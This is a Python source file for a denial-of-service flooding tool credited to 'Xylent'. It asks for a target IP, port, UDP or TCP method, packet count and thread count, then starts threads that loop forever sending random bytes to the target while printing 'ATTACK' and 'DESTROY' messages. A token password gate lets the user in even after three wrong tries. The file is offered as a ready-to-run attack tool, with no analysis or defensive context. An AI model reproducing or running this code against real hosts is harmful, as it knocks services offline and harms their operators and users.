import random
import socket
import threading
import os
import sys
import time

os.system("clear")
#login tools
password ="zxz"

print("""\u001b[35m                              
 __         ______     ______     __     __   __    
/\ \       /\  __ \   /\  ___\   /\ \   /\ "-.\ \   
\ \ \____  \ \ \/\ \  \ \ \__ \  \ \ \  \ \ \-.  \  
 \ \_____\  \ \_____\  \ \_____\  \ \_\  \ \_\\"\_\ 
  \/_____/   \/_____/   \/_____/   \/_/   \/_/ \/_/ 
""")
for i in range(3):
	pwd = input("\u001b[37m[+] Enter Password  : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[!] Please Security To Password!!! ")
		break
	else:
		time.sleep(5)
		print("\u001b[31m[×] Wrong IS Security Password!!! ")
		continue
time.sleep(5)
print("\u001b[35m{√} Successfully Loginned")
time.sleep(2)

os.system("clear")
print(" \033[95m Tools By : Xylent")
print("\033[0m")
print(""" \033[96m
╭━╮╭━┳╮╱╱╭┳╮╱╱╭━━━┳━╮╱╭┳━━━━╮
╰╮╰╯╭┫╰╮╭╯┃┃╱╱┃╭━━┫┃╰╮┃┃╭╮╭╮┃
╱╰╮╭╯╰╮╰╯╭┫┃╱╱┃╰━━┫╭╮╰╯┣╯┃┃╰╯
╱╭╯╰╮╱╰╮╭╯┃┃╱╭┫╭━━┫┃╰╮┃┃╱┃┃
╭╯╭╮╰╮╱┃┃╱┃╰━╯┃╰━━┫┃╱┃┃┃╱┃┃
╰━╯╰━╯╱╰╯╱╰━━━┻━━━┻╯╱╰━╯╱╰╯ """)
print("\033[0m")


ip = str(input("\033[91m Host/Ip Target:"))
port = int(input("\033[0m\033[91m Port Target:"))
choice = str(input("\033[0m\033[91m Method | UDP / TCP |:"))
times = int(input("\033[0m\033[91m Paket :"))
threads = int(input("\033[0m\033[91m Threads:"))

os.system("clear")
def run():
	data = random._urandom(666)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" \033[91m XYLENT ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			print("\033[92m DOWN GAK TUUH!!!")

def run2():
	data = random._urandom(1818)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m XYLENT ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN GAK TUUH!!!")

def run3():
	data = random._urandom(815)
	i = random.choice(("\033[94m [×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m XYLENT ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m DOWN GAK TUUH!!!")


for udp in range(threads):
	if choice == 'UDP':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()   
 
for y in range(threads):
  if choice == 'TCP':
    th = threading.Thread(target = run3)
    th.start() 
   
